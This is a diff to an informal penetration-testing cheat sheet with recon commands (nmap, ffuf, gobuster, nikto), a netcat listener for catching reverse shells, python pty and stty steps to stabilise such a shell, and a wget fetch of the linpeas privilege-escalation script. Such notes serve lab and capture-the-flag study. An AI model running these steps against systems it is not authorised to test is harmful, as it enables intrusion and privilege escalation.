@@ -17,7 +17,7 @@ nmap -sC -sV -p-     <-- this gimme what i need most the time
 fuff -w /usr/share/wordlists/content.txt -t 1 -p 0.1 -u host -mc all -fc 404
 
 this been workin gud.
-gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x .html,.txt,.php,.bak,.back,.zip,.gz,.tar dir -u http://*host*:*port*/
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x .html,.txt,.php dir -u http://*host*:*port*/
 
 nikto -h *host*
 
@@ -49,7 +49,7 @@ nc -vnlp port
 
 nice breakout from basic ass reverse shell
 python -c 'import pty; pty.spawn("/bin/bash")'
---
+--or--
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 if you wanna be fancy... pfft :P
@@ -61,6 +61,7 @@ Ctrl + Z [Background Process]
 stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 
+----
 
 enum tools
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
